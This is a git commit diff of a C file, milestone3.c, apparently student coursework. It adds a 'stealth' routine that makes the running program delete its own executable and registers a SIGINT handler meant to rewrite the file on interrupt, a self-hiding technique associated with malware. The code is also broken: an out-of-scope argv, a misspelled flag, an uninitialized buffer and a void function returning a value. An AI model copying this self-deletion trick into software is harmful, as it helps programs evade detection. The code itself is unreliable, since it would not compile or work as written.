6efb1dfc72708bf245ea76bab45af8741b0a00ca
tjscrib2012 <46504659+tjscrib2012@users.noreply.github.com>
2020-04-27 19:54:31 -0500

    Update milestone3.c

--- milestone3.c
+++ milestone3.c
@@ -10,9 +10,26 @@
 #include <sys/types.h>
 int fd;
 int stealth(int argc,char *argv[]){
-	fd = open(argv[o],O_RDONLY);
+	fd = open(argv[0],O_RDONLY);
 	unlink(argv[0]);
-	//sighandler here
-	//
+	struct sigaction sigHandy;
+
+        sigHandy.sa_handler = &SimpSigHandler;
+		
+        sigHandy.sa_flags = SA_RESTART;
+		
+        sigaction(SIGINT, &sigHandy, NULL);  // Registers/calls the signal handler
+return 0;
+}
+
+// Below is the simple signal handler function that gets called when the signal is caught. 
+void SimpSigHandler (int sigNum){
+	char *buff;
+	if (sigNum == SIGINT){
+		int fd2 = open(argv[0],WRONLY | O_CREAT, S_IRWXU);
+		read(fd,buff,MAX);
+		write(fd2,buff,MAX);
+	}
+
 	return 0;
 }
